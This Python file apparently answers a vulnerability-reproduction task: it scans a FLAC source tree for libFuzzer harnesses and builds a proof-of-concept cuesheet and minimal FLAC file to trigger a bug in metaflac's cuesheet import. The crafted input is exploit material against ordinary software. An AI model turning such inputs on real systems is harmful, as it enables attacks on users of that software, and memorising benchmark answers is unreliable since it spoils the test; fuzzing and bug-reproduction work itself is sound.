import os
import re
import tarfile
import tempfile
from typing import Dict, Iterable, List, Optional, Tuple


def _iter_text_files_from_dir(root: str, max_size: int = 1_000_000) -> Iterable[Tuple[str, str]]:
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh",
        ".py", ".txt", ".md", ".rst", ".in", ".m4", ".am",
        ".sh", ".cmake", ".mk", ".ac", ".y", ".l"
    }
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > max_size:
                continue
            _, ext = os.path.splitext(fn)
            if ext and ext.lower() not in exts:
                continue
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except OSError:
                continue
            if b"\x00" in data:
                continue
            try:
                txt = data.decode("utf-8", "ignore")
            except Exception:
                try:
                    txt = data.decode("latin-1", "ignore")
                except Exception:
                    continue
            yield path, txt


def _iter_text_files_from_tar(tar_path: str, max_size: int = 1_000_000) -> Iterable[Tuple[str, str]]:
    exts = {
        ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh",
        ".py", ".txt", ".md", ".rst", ".in", ".m4", ".am",
        ".sh", ".cmake", ".mk", ".ac", ".y", ".l"
    }
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                if m.size <= 0 or m.size > max_size:
                    continue
                _, ext = os.path.splitext(m.name)
                if ext and ext.lower() not in exts:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                if b"\x00" in data:
                    continue
                try:
                    txt = data.decode("utf-8", "ignore")
                except Exception:
                    try:
                        txt = data.decode("latin-1", "ignore")
                    except Exception:
                        continue
                yield m.name, txt
    except Exception:
        return


def _pack_le_int(v: int, nbytes: int) -> bytes:
    v = int(v) & ((1 << (nbytes * 8)) - 1)
    return v.to_bytes(nbytes, "little", signed=False)


def _make_min_flac(sample_rate: int = 44100, channels: int = 2, bps: int = 16, total_samples: int = 100000) -> bytes:
    if channels < 1:
        channels = 1
    if channels > 8:
        channels = 8
    if bps < 4:
        bps = 4
    if bps > 32:
        bps = 32
    if total_samples < 0:
        total_samples = 0
    if total_samples >= (1 << 36):
        total_samples = (1 << 36) - 1

    header = b"fLaC"
    # METADATA_BLOCK_HEADER: last=1, type=0 (STREAMINFO), length=34
    mbh = bytes([0x80]) + (34).to_bytes(3, "big")

    min_block = 16
    max_block = 16
    min_frame = 0
    max_frame = 0

    streaminfo = bytearray()
    streaminfo += min_block.to_bytes(2, "big")
    streaminfo += max_block.to_bytes(2, "big")
    streaminfo += min_frame.to_bytes(3, "big")
    streaminfo += max_frame.to_bytes(3, "big")

    sr = max(1, min(int(sample_rate), (1 << 20) - 1))
    ch = int(channels) - 1
    bpsm1 = int(bps) - 1
    ts = int(total_samples)

    packed = ((sr & ((1 << 20) - 1)) << (3 + 5 + 36)) | ((ch & 0x7) << (5 + 36)) | ((bpsm1 & 0x1F) << 36) | (ts & ((1 << 36) - 1))
    streaminfo += packed.to_bytes(8, "big")
    streaminfo += b"\x00" * 16
    return header + mbh + bytes(streaminfo)


def _make_cuesheet_poc() -> bytes:
    lines = []
    lines.append("REM FLAC__lead-in 0")
    lines.append("REM FLAC__cuesheet_is_cd true")
    for i in range(8):
        lines.append(f"REM FLAC__seekpoint {i}")
    lines.append('FILE "a" WAVE')
    lines.append("  TRACK 01 AUDIO")
    lines.append("    INDEX 01 00:00:00")
    return ("\n".join(lines) + "\n").encode("ascii", "strict")


def _infer_mode_from_texts(texts: List[Tuple[str, str]]) -> str:
    # modes: "cuesheet", "flac", "fdp_combo"
    harnesses: List[Tuple[str, str]] = []
    for p, t in texts:
        if "LLVMFuzzerTestOneInput" in t or "LLVMFuzzerInitialize" in t:
            harnesses.append((p, t))

    # Direct heuristics: look for metaflac import cuesheet usage
    joined = "\n".join(t for _, t in harnesses) if harnesses else "\n".join(t for _, t in texts[:50])

    if "import-cuesheet" in joined or "import_cuesheet" in joined or "--import-cuesheet-from" in joined:
        # Determine whether fuzz input is cuesheet or flac.
        # If mentions writing data/size to cuesheet or consuming remaining bytes into cuesheet string.
        for _, t in harnesses:
            tl = t.lower()
            if "fuzzeddataprovider" in tl:
                # Might be combo; try to guess which artifact comes from input more directly.
                if re.search(r"consume.*cuesheet|consume.*cue|cuesheet.*consume", tl):
                    return "fdp_combo"
            if ("--import-cuesheet-from" in t or "import-cuesheet-from" in t) and ("cuesheet" in tl or "cue" in tl):
                for line in t.splitlines():
                    ll = line.lower()
                    if "data" in ll and ("cue" in ll or "cuesheet" in ll) and ("write" in ll or "fwrite" in ll or "ofstream" in ll):
                        return "cuesheet"
                    if "consume" in ll and ("cue" in ll or "cuesheet" in ll):
                        return "fdp_combo"
                return "cuesheet"
        return "cuesheet"

    # If the target seems to parse FLAC input directly via libFLAC APIs
    if any("FLAC__" in t and ("read" in t.lower() or "decoder" in t.lower()) for _, t in harnesses):
        return "flac"

    # Default to cuesheet.
    return "cuesheet"


def _infer_fdp_layout(texts: List[Tuple[str, str]]) -> Optional[Tuple[List[Tuple[str, str, Optional[Tuple[str, int]]]], int]]:
    # Returns (segments, pre_consume_bytes)
    # segments: list of (kind, method, leninfo)
    #   kind: 'flac' or 'cue'
    #   method: 'bytes' or 'remaining'
    #   leninfo: (lenvar, nbytes) if method 'bytes' uses a length variable read from input
    # pre_consume_bytes: bytes consumed before the first of these segments (approx; only handles ConsumeBool/ConsumeIntegral/ConsumeBytes for config)
    harness = None
    for p, t in texts:
        if "LLVMFuzzerTestOneInput" in t and "FuzzedDataProvider" in t:
            harness = t
            break
    if harness is None:
        return None

    # Identify length variables and their types
    lenvar_nbytes: Dict[str, int] = {}
    # ConsumeIntegralInRange<T>
    for m in re.finditer(r"\b(\w+)\s*=\s*\w+\s*\.\s*ConsumeIntegralInRange\s*<\s*([^>]+)\s*>\s*\(", harness):
        var = m.group(1)
        ty = m.group(2).strip()
        nbytes = None
        tyl = ty.lower()
        if "size_t" in tyl or "unsigned long" in tyl or "uint64" in tyl or "int64" in tyl or "long long" in tyl:
            nbytes = 8
        elif "uint32" in tyl or "int32" in tyl or "unsigned" == tyl or "int" == tyl:
            nbytes = 4
        elif "uint16" in tyl or "int16" in tyl or "short" in tyl:
            nbytes = 2
        elif "uint8" in tyl or "int8" in tyl or "char" == tyl or "unsigned char" in tyl:
            nbytes = 1
        else:
            # Conservative default
            nbytes = 8
        lenvar_nbytes[var] = nbytes

    for m in re.finditer(r"\b(\w+)\s*=\s*\w+\s*\.\s*ConsumeIntegral\s*<\s*([^>]+)\s*>\s*\(", harness):
        var = m.group(1)
        ty = m.group(2).strip()
        if var not in lenvar_nbytes:
            tyl = ty.lower()
            if "size_t" in tyl or "unsigned long" in tyl or "uint64" in tyl or "int64" in tyl or "long long" in tyl:
                lenvar_nbytes[var] = 8
            elif "uint32" in tyl or "int32" in tyl or "unsigned" == tyl or "int" == tyl:
                lenvar_nbytes[var] = 4
            elif "uint16" in tyl or "int16" in tyl or "short" in tyl:
                lenvar_nbytes[var] = 2
            elif "uint8" in tyl or "int8" in tyl or "char" == tyl or "unsigned char" in tyl:
                lenvar_nbytes[var] = 1
            else:
                lenvar_nbytes[var] = 8

    segs: List[Tuple[int, str, str, Optional[Tuple[str, int]]]] = []

    # ConsumeBytes... -> likely binary file
    for m in re.finditer(r"\b(\w+)\s*=\s*\w+\s*\.\s*ConsumeBytes\s*<[^>]*>\s*\(\s*(\w+)\s*\)", harness):
        var = m.group(1)
        lenvar = m.group(2)
        varl = var.lower()
        kind = "flac" if "flac" in varl else ("cue" if "cue" in varl or "cuesheet" in varl else "flac")
        nbytes = lenvar_nbytes.get(lenvar, 8)
        segs.append((m.start(), kind, "bytes", (lenvar, nbytes)))

    # ConsumeBytesAsString / ConsumeRandomLengthString / ConsumeRemainingBytesAsString -> cue-ish
    for m in re.finditer(r"\b(\w+)\s*=\s*\w+\s*\.\s*ConsumeRemainingBytesAsString\s*\(\s*\)", harness):
        var = m.group(1)
        varl = var.lower()
        kind = "cue" if ("cue" in varl or "cuesheet" in varl) else "flac"
        segs.append((m.start(), kind, "remaining", None))

    for m in re.finditer(r"\b(\w+)\s*=\s*\w+\s*\.\s*ConsumeRemainingBytes\s*<[^>]*>\s*\(\s*\)", harness):
        var = m.group(1)
        varl = var.lower()
        kind = "flac" if "flac" in varl else ("cue" if "cue" in varl or "cuesheet" in varl else "flac")
        segs.append((m.start(), kind, "remaining", None))

    for m in re.finditer(r"\b(\w+)\s*=\s*\w+\s*\.\s*ConsumeBytesAsString\s*\(\s*(\w+)\s*\)", harness):
        var = m.group(1)
        lenvar = m.group(2)
        varl = var.lower()
        kind = "cue" if ("cue" in varl or "cuesheet" in varl) else ("flac" if "flac" in varl else "cue")
        nbytes = lenvar_nbytes.get(lenvar, 8)
        segs.append((m.start(), kind, "bytes", (lenvar, nbytes)))

    if not segs:
        return None

    segs.sort(key=lambda x: x[0])
    segments = [(kind, method, leninfo) for _, kind, method, leninfo in segs]

    # Approximate pre-consume bytes: count ConsumeBool() before first segment; also count ConsumeIntegral* before first segment
    first_pos = segs[0][0]
    pre = harness[:first_pos]
    pre_consume = 0
    pre_consume += pre.count(".ConsumeBool(") * 1

    # Roughly account for ConsumeIntegral<...> in pre
    for m in re.finditer(r"\.\s*ConsumeIntegralInRange\s*<\s*([^>]+)\s*>\s*\(", pre):
        ty = m.group(1).strip().lower()
        if "size_t" in ty or "unsigned long" in ty or "uint64" in ty or "int64" in ty or "long long" in ty:
            pre_consume += 8
        elif "uint32" in ty or "int32" in ty or ty == "unsigned" or ty == "int":
            pre_consume += 4
        elif "uint16" in ty or "int16" in ty or "short" in ty:
            pre_consume += 2
        elif "uint8" in ty or "int8" in ty or ty == "char" or "unsigned char" in ty:
            pre_consume += 1
        else:
            pre_consume += 8

    for m in re.finditer(r"\.\s*ConsumeIntegral\s*<\s*([^>]+)\s*>\s*\(", pre):
        ty = m.group(1).strip().lower()
        if "size_t" in ty or "unsigned long" in ty or "uint64" in ty or "int64" in ty or "long long" in ty:
            pre_consume += 8
        elif "uint32" in ty or "int32" in ty or ty == "unsigned" or ty == "int":
            pre_consume += 4
        elif "uint16" in ty or "int16" in ty or "short" in ty:
            pre_consume += 2
        elif "uint8" in ty or "int8" in ty or ty == "char" or "unsigned char" in ty:
            pre_consume += 1
        else:
            pre_consume += 8

    return segments, pre_consume


def _compose_fdp_input(segments: List[Tuple[str, str, Optional[Tuple[str, int]]]], pre_consume: int, cue: bytes, flac: bytes) -> bytes:
    # Provide leading zeros for pre-consumed config bytes.
    out = bytearray(b"\x00" * max(0, pre_consume))

    for kind, method, leninfo in segments:
        payload = cue if kind == "cue" else flac
        if method == "bytes":
            nbytes = leninfo[1] if leninfo else 8
            out += _pack_le_int(len(payload), nbytes)
            out += payload
        else:
            out += payload
    return bytes(out)


class Solution:
    def solve(self, src_path: str) -> bytes:
        cue = _make_cuesheet_poc()
        flac = _make_min_flac()

        texts: List[Tuple[str, str]] = []
        try:
            if os.path.isdir(src_path):
                for p, t in _iter_text_files_from_dir(src_path):
                    texts.append((p, t))
                    if len(texts) >= 400:
                        break
            else:
                for p, t in _iter_text_files_from_tar(src_path):
                    texts.append((p, t))
                    if len(texts) >= 400:
                        break
        except Exception:
            texts = []

        mode = _infer_mode_from_texts(texts) if texts else "cuesheet"

        if mode == "flac":
            return flac

        if mode == "fdp_combo":
            layout = _infer_fdp_layout(texts)
            if layout is not None:
                segments, pre = layout
                # Ensure we include both artifacts at least once; if only one segment detected, fall back.
                kinds = {k for k, _, _ in segments}
                if "cue" in kinds and "flac" in kinds:
                    return _compose_fdp_input(segments, pre, cue=cue, flac=flac)
                if "cue" in kinds and "flac" not in kinds:
                    # Input likely only cuesheet; return cuesheet.
                    return cue
                if "flac" in kinds and "cue" not in kinds:
                    return flac
            return cue

        return cue